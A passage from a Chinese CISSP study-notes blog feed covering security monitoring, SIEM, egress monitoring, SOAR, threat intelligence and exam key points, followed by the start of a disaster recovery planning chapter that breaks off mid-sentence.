监测技术</h2><p>监测（monitoring）是指检查日志信息以找出特定内容的过程。</p><p>监测可人工、可工具自动化实现。</p><p>监测对于检测主体的恶意行为以及图谋的入侵行为和系统故障是不可缺少的。</p><p>监测可以帮助重建事件、提供起诉证据和创建分析报告。</p><p><strong>监测是一个持续的过程</strong>。</p><p>持续的监测可以确保记录所有事件。</p><p>日志分析（log analysis）是一种详细而系统化的监测形式。</p><p>通过分析日志信息找出趋势和模式以及异常、未经授权、非法和违反策略的活动。</p><p>入侵检测系统（IDS）主动监测多个日志，以实时检测和响应恶意入侵行为。</p><h3 id="1-安全信息和事件管理"><a href="#1-安全信息和事件管理" class="headerlink" title="1. 安全信息和事件管理"></a>1. 安全信息和事件管理</h3><p>中央应用程序来自动监测网络上的系统。</p><p>安全信息和事件管理（SIEM）、安全事件管理（SEM）、安全信息管理（SIM）</p><p>提供集中的日志记录并可在全组织范围内对系统上发生的事件进行实时分析，数据来自远程系统上的代理。</p><p>SIEM 系统收集入侵检测、入侵预防系统、其他来源收集数据，实时监控通信流，分析潜在攻击并发出通知，提供数据长期存储。</p><p>SIEM 具有关联和聚合功能。</p><p>SIEM 内置高级分析工具分析数据并根据预置规则报警和响应。</p><p>大多数 SIEM 都是可配置的，允许组织内部人员设置值得关注并需要转发给 SIEM 服务的项目。</p><p>SIEM 包含精细的关联引擎，引擎是一种软件组件，收集和聚合数据，并找出共同属性，使用高级分析工具检测。</p><p>有些监测工具还有用于库存和状态目的，也就是记录系统详细信息。</p><p>软件监测可以监视未经批准软件的未遂或成功的安装情况、未经授权软件的使用情况或得到批准的软件的未经授权使用情况，降低用户无意安装木马病毒风险。</p><h3 id="2-syslog"><a href="#2-syslog" class="headerlink" title="2. syslog"></a>2. syslog</h3><p>RFC 5424 syslog 协议描述了用于发送事件通知消息的 syslog 协议。</p><p>协议规定了应该怎样格式化消息和怎样将消息发送给 syslog 服务器，但是没有规定怎么处理消息。</p><p>syslog 服务器接收来自任何来源的消息。</p><h3 id="3-抽样"><a href="#3-抽样" class="headerlink" title="3. 抽样"></a>3. 抽样</h3><p>抽样（sampling）也叫数据提取（data extraction）</p><p>指从庞大数据体中提取特定元素以构建有意义的概述或摘要的过程。</p><p>抽样是一种数据缩减形式，使只在审计踪迹中查看小部分数据样本，便可以收集到有价值的信息。</p><p>统计抽样利用精确的数字函数从大量数据中提取有意义的信息。</p><p>抽样始终存在一个风险-抽样数据可能并不是整体数据的准确体现，但统计抽样可以标明误差范围。</p><h3 id="4-剪切级"><a href="#4-剪切级" class="headerlink" title="4. 剪切级"></a>4. 剪切级</h3><p>剪切是一种非统计抽样。</p><p>剪切只选择超过剪切级（clipping level）的事件，而剪切级是预先定好的一个事件阈值，事件达到阈值之前，系统忽略事件。</p><p>剪切级广泛用于审计事件的过程，为常规系统或用户活动创建一条基线。</p><p>非统计抽样是任意抽样，或是由审计员自行决定的抽样。</p><p>非统计抽样用于聚焦特定事件时，会非常有效。</p><p>与统计抽样相比，非统计抽样成本更低，也更容易实施。</p><h3 id="5-其他检测工具"><a href="#5-其他检测工具" class="headerlink" title="5. 其他检测工具"></a>5. 其他检测工具</h3><p>日志是用于监测的主要工具。</p><h4 id="CCTV"><a href="#CCTV" class="headerlink" title="CCTV"></a>CCTV</h4><p>闭路电视监控系统 CCTV 可以自动将事件记录到磁带上以供日后查看。</p><h4 id="击键监测"><a href="#击键监测" class="headerlink" title="击键监测"></a>击键监测</h4><p>击键监测（keystroke monitoring）是记录用户实体键盘击键动作的行为。</p><p>通过技术手段（硬件或软件）、摄像头监视完成。</p><p>击键监测主要被攻击者用于恶意目的，但在极端情况下，组织也可能用来监测和分析用户活动。</p><p>击键监测经常被比作窃听，通过雇佣协议、安全策略或登录区警示标志将监测的存在告知用户。</p><h4 id="通信流分析和趋势分析"><a href="#通信流分析和趋势分析" class="headerlink" title="通信流分析和趋势分析"></a>通信流分析和趋势分析</h4><p>通信流分析（traffic analysis）和 趋势分析（trend analysis），检查数据包流动而非数据包实际内容的监测形式。</p><p>也被称为网流监测（network flow monitoring），可以推断出大量信息，例如主通信路由等。</p><p>通信流会揭示可以的通信流模式。</p><p>通信流分析可以检测是否存在不遵守职业操守的内部人员将内部信息转发给未经授权方。</p><h2 id="17-3-4-日志管理"><a href="#17-3-4-日志管理" class="headerlink" title="17.3.4 日志管理"></a>17.3.4 日志管理</h2><p>日志管理是指用来收集、处理和保护日志条目的所有方法。</p><p>SIEM 系统收集和聚和来自多个系统的日志条目，分析条目并报告任何可疑事件。</p><p>滚动日志（rollover logging），也称为循环日志、日志循环，为日志设置一个最大容量阈值，达到阈值，开始覆盖日志中最早的事件。</p><p>Windows 系统允许管理员把日志归档保存，存在系统硬盘驱动器可能被存档日志文件填满的风险。</p><p>创建和调度一个 powershell 脚本，以便于定期归档日志文件并将其复制到另一个位置。</p><p>保存日志条目的同时防止日志填满硬盘。</p><h2 id="17-3-5-出口监测"><a href="#17-3-5-出口监测" class="headerlink" title="17.3.5 出口监测"></a>17.3.5 出口监测</h2><p>对通信流的监测并非仅仅针对网络内的或进入网络的通信流。</p><p>也需要监测离开网络流向互联网的通信流，也就是出口监测。</p><p>出口监测可以检测数据未经授权的向外传输，也就是数据外泄。</p><p>数据丢失预防（DLP）技术和隐写术监测是用来检测或预防数据外泄的两种常见方法。</p><h3 id="隐写术"><a href="#隐写术" class="headerlink" title="隐写术"></a>隐写术</h3><p>允许攻击者把消息嵌入其他文件。</p><p>用户哈希算法对文件创建哈希值，比对哈希值，哈希值相同，文件中没有隐藏消息，哈希值不同，表明有人修改过第二个文件。</p><p>组织可以定期捕捉很少有改动的内部文件的哈希值。</p><h3 id="DLP"><a href="#DLP" class="headerlink" title="DLP"></a>DLP</h3><p>数字水印（digital watermark）</p><p>数字水印是隐秘镶嵌在数字文件中的标记。</p><p>DLP 系统可以检测未加密文件中的水印。</p><p>DLP 系统不能检查加密数据的内容，但是可以监测流出网络的加密数据量、数据流向以及发送数据的系统。</p><p>DLP 也可以包含监测发送到网络外的加密数据量的工具。</p><h1 id="17-4-自动事件响应"><a href="#17-4-自动事件响应" class="headerlink" title="17.4 自动事件响应"></a>17.4 自动事件响应</h1><h2 id="17-4-1-了解-SOAR"><a href="#17-4-1-了解-SOAR" class="headerlink" title="17.4.1 了解 SOAR"></a>17.4.1 了解 SOAR</h2><p>安全编排、自动化和响应（security orchestration，automation，and response，SOAR）</p><p>指可以使组织自动响应某些事件的一组技术。</p><p>SOAR 可根据事件的不同向管理员发出警报或采取其他行动。</p><p>SOAR 允许安全管理员定义事件以及对事件的响应，通常使用剧本和运行脚本。</p><h3 id="剧本"><a href="#剧本" class="headerlink" title="剧本"></a>剧本</h3><p>剧本是定义了应该怎样核实事件的一份文件或检查列表。</p><p>剧本还提供响应的详细信息。</p><h3 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h3><p>运行脚本贯彻实施剧本数据，使成为一种自动化工具。</p><p>SOAR 技术可以响应任何攻击，难点在于如何把已知事件和响应措施写入剧本，并配置自动做出响应。</p><p>剧本的主要目的是规定运行脚本应该做什么，管理员也可以参照剧本手动完成步骤。</p><h2 id="17-4-2-机器学习和-AI-工具"><a href="#17-4-2-机器学习和-AI-工具" class="headerlink" title="17.4.2 机器学习和 AI 工具"></a>17.4.2 机器学习和 AI 工具</h2><p>使用人工智能 AI  和 机器学习 ML。</p><ul><li><p>机器学习是人工智能的一部分，是指可以通过经验自动改进的系统。机器学习赋予计算机系统学习的能力。</p></li><li><p>人工智能是一个广泛的领域，其中包含机器学习。</p><p>人工智能使机器具备能力去做原本人类更擅长的事，或者使机器得以执行我们以前以为要考人类智慧才能完成的任务。</p><p>是一个不断向前发展的目标。</p></li></ul><p>机器学习系统（人工智能的一部分）始于一套规则或指南。</p><p>人工智能系统从一无所知，逐步学习规则，创建算法，并基于规则应用机器学习技术。</p><p>基于行为的检测系统看作机器学习和人工智能应用于网络安全的一种方式。</p><p>管理员创建基线，并给与反馈，机器学习系统以基线为起点，根据反馈总结经验，修改初始基线。</p><p>人工智能系统开始时没有基线，监测通信流，并根据观察到的通信流创建基线并发现异常，同时依靠管理员反馈学习。</p><h2 id="17-4-3-威胁情报"><a href="#17-4-3-威胁情报" class="headerlink" title="17.4.3 威胁情报"></a>17.4.3 威胁情报</h2><p>威胁情报（threat intelligence）是指收集有关潜在威胁的数据，包括利用各种来源及时获得有关当前威胁的信息。</p><h3 id="1-了解杀伤链"><a href="#1-了解杀伤链" class="headerlink" title="1. 了解杀伤链"></a>1. 了解杀伤链</h3><p>杀伤链阶段：</p><p>（1）通过侦察寻找或识别目标</p><p>（2）确定目标的位置</p><p>（3）跟踪目标的移动</p><p>（4）挑选打击目标的武器</p><p>（5）用选定的武器打击目标</p><p>（6）评估攻击的效果</p><p>网络杀伤链模型：<br>（1）<strong>侦察</strong>  攻击者收集有关目标的信息</p><p>（2）<strong>武器化</strong>  攻击者识别目标可供利用的漏洞，以及发送漏洞利用点的方法</p><p>（3）<strong>交付</strong>  攻击者通过网络钓鱼攻击、恶意电子邮件附件、被操纵的网站或其他社工伎俩向目标发送武器。</p><p>（4）<strong>利用</strong>  武器利用目标系统的漏洞</p><p>（5）<strong>安装</strong>  开发可以利用漏洞并安装恶意软件的代码</p><p>恶意软件通常包含后后门，运行目标远程访问系统</p><p>（6）<strong>指挥和控制</strong>  攻击者维护一个指挥和控制系统，以控制目标和其他被操纵的系统</p><p>（7）<strong>目标行动</strong>  攻击者达到最初目标。</p><p>模型框架目的是通过在攻击的任何阶段阻止攻击者来破坏这条攻击链。</p><h3 id="2-了解-MITRE-ATT-CK"><a href="#2-了解-MITRE-ATT-CK" class="headerlink" title="2. 了解 MITRE ATT&amp;CK"></a>2. 了解 MITRE ATT&amp;CK</h3><p>MITRE ATT&amp;CK 矩阵（由MITRE 创建）是内含已被识别的战术、技术和规程（TTP）的知识库，可供攻击者在各种攻击中使用。</p><p>ATT&amp;CK 是网络杀伤链等模型的补充。</p><p>ATT&amp;CK 矩阵是一个活文档，每年至少更新两次。</p><p>矩阵包含的战术：</p><ul><li>侦察</li><li>资源开发</li><li>初始访问</li><li>执行</li><li>持续存在</li><li>特权提升</li><li>防御规避</li><li>凭证访问</li><li>发现</li><li>横向移动</li><li>收集</li><li>指挥和控制</li><li>外泄</li><li>影响</li></ul><p>每种战术都包含攻击者使用的技术手段。</p><h3 id="3-威胁馈送"><a href="#3-威胁馈送" class="headerlink" title="3.  威胁馈送"></a>3.  威胁馈送</h3><p>馈送（feed）是一种可供用户滚动浏览的稳定内容流。用户可以订阅各种内容。</p><p>威胁馈送（threat feed）是关于当前和潜在威胁的一种稳定原始数据流。</p><p>威胁情报馈送力求从原始数据中提取可执行的情报。</p><p>威胁情报馈送包含的部分信息：</p><ul><li>可疑域</li><li>已知恶意软件哈希值</li><li>互联网网站共享的代码</li><li>与恶意活动关联的 IP 地址</li></ul><p>安全专家通过将威胁馈送中的数据与进出互联网的数据进行比较，可以从中识别出潜在的恶意通信流。</p><p>日志跟踪进出的通信流，手动方式交叉检查来自威胁馈送的数据，可以使用额外的自动化工具。</p><h3 id="4-威胁搜寻"><a href="#4-威胁搜寻" class="headerlink" title="4. 威胁搜寻"></a>4. 威胁搜寻</h3><p>威胁搜寻（threat hunting）是指在网络中主动查找网络威胁的过程。</p><p>威胁搜寻假定攻击者已经潜藏在网络中。</p><p>使用杀伤链模型进行威胁搜寻。</p><h2 id="17-4-4-SOAR、机器学习、人工智能和威胁馈送的交叉融汇"><a href="#17-4-4-SOAR、机器学习、人工智能和威胁馈送的交叉融汇" class="headerlink" title="17.4.4 SOAR、机器学习、人工智能和威胁馈送的交叉融汇"></a>17.4.4 SOAR、机器学习、人工智能和威胁馈送的交叉融汇</h2><p>SOAR 技术首先需要有剧本，即被管理员用来验证和响应事件的书面指南，然后人员执行贯彻指南的运行脚本。</p><p>IDPS 经常发出假阳性报告（即发出警报但问题实际不存在），SOAR 技术会依照剧本所含指南自动处理假阳性报告。</p><p>IDPS  的假阴性报告可以通过实时更新威胁信息。</p><p>SOAR 技术接收和处理威胁馈送，确保所有的预防和检测系统都知晓新威胁并自动进行响应。</p><p>SOAR 技术都在不断改进并减轻管理员的工作负担。</p><h1 id="17-5-本章小结"><a href="#17-5-本章小结" class="headerlink" title="17.5 本章小结"></a>17.5 本章小结</h1><h1 id="17-6-考试要点"><a href="#17-6-考试要点" class="headerlink" title="17.6 考试要点"></a>17.6 考试要点</h1><h2 id="列出和描述事件管理步骤"><a href="#列出和描述事件管理步骤" class="headerlink" title="列出和描述事件管理步骤"></a>列出和描述事件管理步骤</h2><p>事件管理步骤：检测、响应、抑制、报告、恢复、补救和总结教训。</p><p>检测并证明有事件发生后，第一响应是限制或控制事件的范围，同时保护证据。</p><p>根据相关法律，组织可能需要把事件上报相关部门。</p><p>如果个人身份信息（PII）受到影响，则还需要把情况通知相关个人。</p><p>补救和总结教训阶段包括进行根本原因分析，以确定原因和提出解决方案，以防事件再次发生。</p><h2 id="了解基本预防措施"><a href="#了解基本预防措施" class="headerlink" title="了解基本预防措施"></a>了解基本预防措施</h2><p>基本预防措施可以防止许多事件发生。</p><p>这些措施包括保持系统即时更新、移除或禁用不需要的协议和服务、使用入侵检测和预防系统、使用配备了最新签名的反恶意软件程序以及启用基于主机和网络的防火墙。</p><h2 id="了解白名单和黑名单的差异"><a href="#了解白名单和黑名单的差异" class="headerlink" title="了解白名单和黑名单的差异"></a>了解白名单和黑名单的差异</h2><p>软件白名单提供一个得到批准的软件列表，以防止未被列入名单的任何其他软件被安装到系统中。</p><p>黑名单则提供一个未得到批准的软件列表，以防止被列入名单的任何软件被安装到系统中。</p><h2 id="了解沙箱"><a href="#了解沙箱" class="headerlink" title="了解沙箱"></a>了解沙箱</h2><p>沙箱提供了一个隔离的环境，可以组织沙箱内运行的代码与沙箱外的元素交互。</p><h2 id="了解第三方提供的安全服务"><a href="#了解第三方提供的安全服务" class="headerlink" title="了解第三方提供的安全服务"></a>了解第三方提供的安全服务</h2><p>第三方安全服务可帮助组织增强内部员工提供的安全服务。</p><p>许多组织用基于云的解决方案来增强内部安全。</p><h2 id="了解僵尸网、僵尸网控制者和僵尸牧人"><a href="#了解僵尸网、僵尸网控制者和僵尸牧人" class="headerlink" title="了解僵尸网、僵尸网控制者和僵尸牧人"></a>了解僵尸网、僵尸网控制者和僵尸牧人</h2><p>僵尸网可以调动大量计算机发动攻击而形成一种重大威胁，因此，有必要了解什么是僵尸网。</p><p>僵尸网是遭入侵的计算设备（通常被称为傀儡或僵尸）的集合体，形成一个网络，由被称为僵尸牧人的犯罪分子操控。</p><p>僵尸牧人通过 C&amp;C 服务器远程控制僵尸，经常利用僵尸网对其他系统发起攻击，或发送垃圾邮件或网络钓鱼邮件。</p><p>僵尸牧人还把僵尸网的访问权出租给其他犯罪分子。</p><h2 id="了解拒绝服务（DoS）攻击"><a href="#了解拒绝服务（DoS）攻击" class="headerlink" title="了解拒绝服务（DoS）攻击"></a>了解拒绝服务（DoS）攻击</h2><p>DoS 攻击阻止系统响应合法服务请求。</p><p>破坏 TCP  三次握手的 SYN 洪水攻击是一种常见的 DoS 攻击手段。</p><p>即便较老式的攻击由于基本预防措施的拦截而在今天已不太常见，依然会遇到这方面的考题，因为许多新式攻击手段往往只是旧方法的变体。</p><p>smurf 攻击利用一个放大网向受害者发送大量响应包。</p><p>死亡之 ping 攻击向受害者发送大量超大 ping 包，导致受害者系统冻结、崩溃或重启。</p><h2 id="了解零日利用"><a href="#了解零日利用" class="headerlink" title="了解零日利用"></a>了解零日利用</h2><p>零日利用是指利用一个除攻击者以外其他任何人都不知道或只有有限的几个人知道的漏洞的攻击。</p><p>从表面上看，这像是一种无从防范的未知漏洞，但基本安全保护措施还是能对预防零日利用提供很大帮助的。</p><p>通过移除或禁用不需要的协议和服务，可以缩小系统的受攻击面</p><p>通过启用防火墙，能封锁许多访问点</p><p>通过采用入侵检测和预防系统，可以帮助检测和拦截潜在的攻击</p><p>通过使用蜜罐等工具，可以帮助保护活跃的网络</p><h2 id="了解中间人攻击"><a href="#了解中间人攻击" class="headerlink" title="了解中间人攻击"></a>了解中间人攻击</h2><p>当一名恶意用户能够在通信线路的两个端点之间占据一个逻辑位置时，便意味着发生了中间人攻击。</p><p>尽管为了完成一次中间人攻击，攻击者需要做相当多的复杂事情，但他从攻击中获得的数据量也是相当大的。</p><h2 id="了解入侵检测和入侵预防"><a href="#了解入侵检测和入侵预防" class="headerlink" title="了解入侵检测和入侵预防"></a>了解入侵检测和入侵预防</h2><p>IDS 和 IPS 是抵御攻击的重要检测和预防手段。</p><p>需要了解基于知识的检测（使用了一个与反恶意软件签名库类似的数据库）和基于行为的检测之间的区别。</p><p>基于行为的检测先创建一条基线以识别正常行为，然后把各种活动与基线相比较，从而检测出异常活动。</p><p>如果网络发生改动，基线可能会过时，因此环境一旦发生变化，基线必须马上更新。</p><h2 id="认识-IDS-IPS-响应"><a href="#认识-IDS-IPS-响应" class="headerlink" title="认识 IDS&#x2F;IPS 响应"></a>认识 IDS&#x2F;IPS 响应</h2><p>IDS 可通过日志记录和发送通知来被动做出响应，也可通过更改环境来主动做出响应。</p><p>有人把主动 IDS 称为 IPS 。</p><p>IPS 被放置在承载通信流的内联线路上，可在恶意通信流到达目标之前拦截它们。</p><h2 id="了解-HIDS-与-NIDS-的区别"><a href="#了解-HIDS-与-NIDS-的区别" class="headerlink" title="了解 HIDS 与 NIDS 的区别"></a>了解 HIDS 与 NIDS 的区别</h2><p>基于主机的 IDS（HIDS）只能监测单个系统上的活动。缺点是攻击者可以发现并禁用它们。</p><p>基于网络的 IDS（NIDS）可以监测一个网络上的活动，而且是攻击者不可见的。</p><h2 id="描述蜜罐和蜜网"><a href="#描述蜜罐和蜜网" class="headerlink" title="描述蜜罐和蜜网"></a>描述蜜罐和蜜网</h2><p>蜜罐是通常用伪缺陷和假数据来引诱入侵者的一个系统。</p><p>蜜网是一个网络里的两个或多个蜜罐。</p><p>管理员可在攻击者进入蜜罐后观察他们的活动，攻击者只要在蜜罐里，他们就不会在活跃网络中。</p><h2 id="了解拦截恶意代码的方法"><a href="#了解拦截恶意代码的方法" class="headerlink" title="了解拦截恶意代码的方法"></a>了解拦截恶意代码的方法</h2><p>将几种工具结合起来使用时可拦截恶意代码。</p><p>反恶意软件程序安装在每个系统、网络边界和电子邮件服务器上，配有最新定义，是最明显的工具。</p><p>基于最小特权原则等基础安全原则的策略也会阻止普通用户按照潜在的恶意软件。</p><p>针对风险和攻击者常用的传播病毒的方法对用户开展教育，也可帮助用户了解和规避危险行为。</p><h2 id="了解日志文件的类型"><a href="#了解日志文件的类型" class="headerlink" title="了解日志文件的类型"></a>了解日志文件的类型</h2><p>日志数据被记录在数据库和各类日志文件里。</p><p>常见的日志文件包括安全日志、系统日志、应用日志、防火墙日志、代理日志和变更日志。</p><p>日志文件应该集中存储，以限制访问权限等方式予以保护，而归档日志应设置为只读，以防有人篡改。</p><h2 id="了解监测以及监测工具的用途"><a href="#了解监测以及监测工具的用途" class="headerlink" title="了解监测以及监测工具的用途"></a>了解监测以及监测工具的用途</h2><p>监测是侧重于主动审查日志文件数据的一种审计形式。</p><p>监测用于使行事主体对自己的行为负责以及监测异常或恶意活动。</p><p>监测还用于监控系统性能。</p><p>IDS、SIEM 等监测工具可以自动持续进行监测并提供对事件的实时分析，包括监测网络内的情况、进入网络的通信流和离开网络的通信流（也叫出口监测）。</p><p>日志管理包括分析日志和归档日志。</p><h2 id="解释审计踪迹"><a href="#解释审计踪迹" class="headerlink" title="解释审计踪迹"></a>解释审计踪迹</h2><p>审计踪迹是在将有关事件及事发情况的信息写入一个或多个数据库或日志文件中时创建的记录。</p><p>审计踪迹可用于重建事件、提取事件信息、证明罪责或反驳指控。</p><p>使用审计踪迹是执行检测性安全控制的一种被动形式。</p><p>审计踪迹还是起诉犯罪份子的基本证据。</p><h2 id="了解如何保持问责"><a href="#了解如何保持问责" class="headerlink" title="了解如何保持问责"></a>了解如何保持问责</h2><p>通过使用审计，可保持对个人行事主体的问责。</p><p>日志记录用户活动，用户要对记录在案的行为负责。这对用户形式良好行为习惯、遵守组织安全策略有着直接的促进作用。</p><h2 id="了解抽样和剪切"><a href="#了解抽样和剪切" class="headerlink" title="了解抽样和剪切"></a>了解抽样和剪切</h2><p>抽样也叫数据提取，是指从大量数据中提取特定元素，构成有意义的概述或摘要的过程。</p><p>统计抽样利用精确的数学函数从大量数据中提取有意义的信息。</p><p>剪切作为非统计抽样的一种形式，只记录超过阈值的事件。</p><h2 id="描述威胁馈送和威胁搜寻"><a href="#描述威胁馈送和威胁搜寻" class="headerlink" title="描述威胁馈送和威胁搜寻"></a>描述威胁馈送和威胁搜寻</h2><p>威胁馈送可向组织提供稳定的原始数据流。</p><p>安全管理员通过分析威胁馈送，可以掌握当前威胁的情况。</p><p>随后利用分析威胁馈送的信息在网络中展开搜索，从中寻找威胁的迹象。</p><h2 id="了解机器学习（ML）和人工智能（AI）之间的管理"><a href="#了解机器学习（ML）和人工智能（AI）之间的管理" class="headerlink" title="了解机器学习（ML）和人工智能（AI）之间的管理"></a>了解机器学习（ML）和人工智能（AI）之间的管理</h2><p>ML  是 AI  的组成部分，是指系统的学习能力。</p><p>AI 是涵盖面很广的一个主题，其中包含 ML。</p><h2 id="了解-SOAR"><a href="#了解-SOAR" class="headerlink" title="了解 SOAR"></a>了解 SOAR</h2><p>SOAR 技术可以对事件自动做出响应。</p><p>SOAR 的主要好处之一是它可以减轻管理员的工作负担，还可以通过让计算机系统做出响应来消除人为错误。</p><h1 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h1><p>事件管理流程步骤</p><p>IDS类型</p><p>ABCD❌ BCD</p><p>​事件管理的 7 个步骤：检测、响应、抑制、报告、恢复、补救和总结教训</p><p>A✅</p><p>D✅</p><p>ACD✅</p><p>B✅</p><p>A❌ B</p><p>​日志复制到另一个驱动器以防止丢失</p><p>A✅</p><p>A✅</p><p>C✅</p><p>D✅</p><p>B✅</p><p>A✅</p><p>D✅</p><p>B✅</p><p>​IPS 部署在承载通信流的线路上，因此 IPS 位于交换机之前。</p><p>B✅</p><p>B✅</p><p>​基于异常的 IDS （基于行为的 IDS）可以检测出新的安全威胁</p><p>​基于签名的 IDS 只检测已知威胁的攻击</p><p>​主动 IDS 可以在检测到威胁后做出响应</p><p>​基于网络的 IDS 可以是基于签名的，也可以是基于异常的</p><p>A❌</p><p>​安全信息和事件管理SIEM 是一种集中式应用程序，可对多个系统实施监测。</p><p>​安全编排、自动化和响应（SOAR）是可以对常见攻击自动做出响应的一组技术。</p><p>D✅</p><p>A✅</p><p>A✅</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>seccert</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>seccert</tag>
      
      <tag>cissp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>18-域6安全评估与测试+域7安全运营-灾难恢复计划</title>
    <link href="/2025/04/21/security/seccert/cissp/18-%E5%9F%9F6%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0%E4%B8%8E%E6%B5%8B%E8%AF%95+%E5%9F%9F7%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5-%E7%81%BE%E9%9A%BE%E6%81%A2%E5%A4%8D%E8%AE%A1%E5%88%92/"/>
    <url>/2025/04/21/security/seccert/cissp/18-%E5%9F%9F6%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0%E4%B8%8E%E6%B5%8B%E8%AF%95+%E5%9F%9F7%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5-%E7%81%BE%E9%9A%BE%E6%81%A2%E5%A4%8D%E8%AE%A1%E5%88%92/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>业务连续性计划（business continuity planning，BCP）：评估优先级，设计弹性流程，从而在灾难发生时保障业务持续运营。</p><p>灾难恢复计划（disaster recovery planning，DRP）是对业务为中心的 BCP 演习的技术补充，包括在中断发生后尽快阻止中断并促进服务恢复的技术控制。</p><p>灾难恢复计划 DRP &#x2F;  业务连续性计划 BCP 共同引导应急响应人员采取行动，直至达到最终目标-使<strong>主要运营设施</strong>恢复<strong>全部运营能力</strong></p><h1 id="18-1-灾难的本质"><a href="#18-1-灾难的本质" class="headerlink" title="18.1 灾难的本质"></a>18.1 灾难的本质</h1><p>灾难恢复计划目的使组织正常运营中断后出现的混乱局面恢复正常。</p><p>一旦 IT 无法支持关键任务进程，就需要通过 DRP 来管理还原和恢复过程。</p><p>DRP 应该被设置为尽可能自动运行。</p><p>DRP 应该被设计成在灾难期间尽可能减少决策活动。</p><p>应该对重要人员进行培训，确保在灾难发生时承担责任和任务并知道需要采取的措施。</p><h2 id="18-1-1-自然灾难"><a href="#18-1-1-自然灾难" class="headerlink" title="18.1.1 自然灾难"></a>18.1.1 自然灾难</h2><p>自然灾难反映了生存环境的恶劣之处。</p><p>存在发生前可以警示的灾难和瞬间造成大面积破坏的灾难，灾难恢复计划 DRP 应提供针对这两类灾难的响应机制。</p><h3 id="地震"><a href="#地震" class="headerlink" title="地震"></a>地震</h3><p>地震由大陆板块的移动引发，全世界任何地方都可能发生地震，而且没有预警。</p><p>地震在已知的断层上发生的可能性更大。</p><p>DRP 应当说明在地震导致正常活动中断时人员需要执行的流程。</p><p>地震风险在一个州内并不一致，要知道，高风险州中的一些地区实际上风险非常低，而几乎每个州都有地震风险高的地区。</p><h3 id="洪水"><a href="#洪水" class="headerlink" title="洪水"></a>洪水</h3><p>世界上的任何地方都可能发生洪灾，而且洪灾几乎随时都可能发生。</p><p>当洪水袭击业务设施时，DRP 必须能做出恰当的响应。</p><h3 id="暴风雨"><a href="#暴风雨" class="headerlink" title="暴风雨"></a>暴风雨</h3><p>强降雨导致山洪爆发</p><p>飓风和龙卷风破坏建筑物完整性</p><p>暴风雨带来的闪电，可能严重破坏敏感的电子设备。</p><p>业务连续性计划应该详细描述防止闪电危害的恰当机制，并且灾难恢复计划应当为可能在闪电袭击中出现的电力中断和设备损坏等情况提供足够的保护。</p><h3 id="火灾"><a href="#火灾" class="headerlink" title="火灾"></a>火灾</h3><p>火灾既可能是人为的，也可能是自然引起的，但两者都有破坏性。</p><p>BCP &#x2F; DRP 实时过程中，应该评估火灾带来的风险，并采取最基本的措施来抑制风险，在关键设施发生灾难性火灾后恢复业务。</p><p>野火的行为可能不可预测，需要时刻保持警惕。</p><h3 id="流行病"><a href="#流行病" class="headerlink" title="流行病"></a>流行病</h3><p>流行病对社会构成重大的健康和安全风险，并有可能以不同于其他灾难的方式扰乱商业运营。</p><h3 id="其他自然事件"><a href="#其他自然事件" class="headerlink" title="其他自然事件"></a>其他自然事件</h3><p>BCP&#x2F;DRP 实施过程中，评估团队应当分析组织的所有运营地区，并评估这类事件可能对业务造成的影响。</p><p>如果业务分布在不同的地区，应当明智地将当地应急响应专家纳入策划团队中。</p><h2 id="18-1-2-人为灾难"><a href="#18-1-2-人为灾难" class="headerlink" title="18.1.2 人为灾难"></a>18.1.2 人为灾难</h2><h3 id="火灾-1"><a href="#火灾-1" class="headerlink" title="火灾"></a>火灾</h3><p>粗心、接错电线、不正确的防火行为等人为原因导致火灾</p><h3 id="恐怖行为"><a href="#恐怖行为" class="headerlink" title="恐怖行为"></a>恐怖行为</h3><p>恐怖行为具有不可预测性，为 DRP 团队带来了特殊挑战。</p><p>促进业务成员之间有关潜在威胁的对话。</p><p>灾难恢复计划的策划者必须强调稳健的风险管理原则，并确保没有针对恐怖威胁过度分配资源，以免影响其他为防范更可能发生的威胁而进行的 DRP&#x2F;BCP 活动。</p><h3 id="爆炸"><a href="#爆炸" class="headerlink" title="爆炸"></a>爆炸</h3><p>爆炸可能源自很多人为因素。</p><p>从灾难计划的角度看，爆炸与那些大型火灾引发的灾害有着相似的结果</p><h3 id="电力中断"><a href="#电力中断" class="headerlink" title="电力中断"></a>电力中断</h3><p>即使是最初级的灾难恢复计划，也应该涵盖如何应对短时间电力中断的威胁。</p><p>组织通常用不间断电源（UPS）设备保护关键业务系统，使其至少有足够长的时间关闭系统或开启应急发电机。</p><p>定期检查 UPS ，务必审计每个 UPS  支持的设备数量&#x2F;类型。</p><p>BCP&#x2F;DRP 团队应当考虑备用电源，从而能够长时间为业务系统提供电力。</p><h3 id="网络、公共设施和基础设施故障"><a href="#网络、公共设施和基础设施故障" class="headerlink" title="网络、公共设施和基础设施故障"></a>网络、公共设施和基础设施故障</h3><p>当编制计划的人考虑公共设施停止运转可能对组织造成的影响时，首先想到的自然是电力中断造成的影响。</p><p>还应该考虑其他公共设施，是否有依赖于水、下水道、天然气或其他公共设施的关键业务系统，还要考虑地区性的基础设施，如公路、机场或铁路</p><p>必须把互联网看作公共设施，需要考虑：</p><p>网络连接冗余</p><p>单点故障</p><p>备用光纤入口</p><p>备用处理站点容量</p><h3 id="硬件-软件故障"><a href="#硬件-软件故障" class="headerlink" title="硬件&#x2F;软件故障"></a>硬件&#x2F;软件故障</h3><p>计算机都会出现故障。</p><p>硬件组件可能由于磨损或受到物理损坏而不再继续运行</p><p>软件也会有漏洞，或者因为人员输入了不正确&#x2F;意外的操作指令而受到影响。</p><p>BCP&#x2F;DRP 